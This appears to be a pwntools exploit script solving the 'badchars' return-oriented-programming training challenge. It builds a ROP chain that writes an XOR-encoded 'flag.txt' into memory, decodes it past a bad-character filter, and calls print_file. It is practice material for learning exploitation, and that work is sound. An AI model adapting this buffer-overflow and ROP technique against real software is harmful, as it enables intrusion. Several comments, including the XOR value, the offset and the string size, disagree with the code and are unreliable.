from pwn import *
import warnings
warnings.filterwarnings("ignore")

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-gef
continue
'''.format(**locals())

exe = './badchars'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

def find_eip(payload):
    p = process(exe)
    p.sendlineafter('>', payload)
    p.wait()
    pattern = p.corefile.read(p.corefile.rsp, 4)
    rip_offset = cyclic_find(pattern, alphabet='bcdefhijk')
    info('located RIP offset at {a}'.format(a=rip_offset))
    return rip_offset

eip_offset = find_eip(cyclic(100, alphabet='bcdefhijk'))

io = start()
info(io.recvline_contains('badchars are'))

data_section_address = 0x601030
pop_r12_r13_r14_r15 = 0x40069c  # pop r12; pop r13; pop r14; pop r15; ret;
mov_r13_r12 = 0x400634  # mov qword ptr [r13], r12; ret;
pop_r14_r15 = 0x4006a0  # pop r14; pop r15; ret;
xor_r15_r14 = 0x400628  # xor byte ptr [r15], r14b; ret;
pop_rdi = 0x4006a3  # pop rdi; ret;
print_file = 0x400620

value_to_xor_with = 3
xored_string = xor('flag.txt', value_to_xor_with)
info("flag.txt XORd with %d: %s", value_to_xor_with, xored_string)

xor_xploit = b""
data_addr_offset = 0
for c in xored_string:
    xor_xploit += pack(pop_r14_r15)  # Pop the next params into r14 and r15
    xor_xploit += pack(value_to_xor_with)  # Value to XOR with ('2' in our case)
    xor_xploit += pack(data_section_address + data_addr_offset)  # Address of .data section with offset to current char
    xor_xploit += pack(xor_r15_r14)  # XOR the value in memory address pointed to by r15 with the value in r14
    data_addr_offset += 1  # Add an extra byte to offset each loop until we've covered all chars

payload = flat(
    asm('nop') * eip_offset,  # Offset - 44 bytes
    pop_r12_r13_r14_r15,  # Pop 4 byte string (1) into r12 and .data location to r13 (2)
    xored_string,  # 1 - Note we can do 8 bytes as 64-bit
    data_section_address,  # 2
    0x00,  # r14 - don't need
    0x00,  # r15 - don't need
    mov_r13_r12,  # Move string from r12 (1) to memory location (2) stored in r13

    # TODO: XOR
    xor_xploit,

    # Pop the data address to RDI and call print_file
    pop_rdi,
    data_section_address,
    print_file
)

# Send the payload to a new copy of the process
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

# Get our flag!
flag = io.recv()
success(flag)
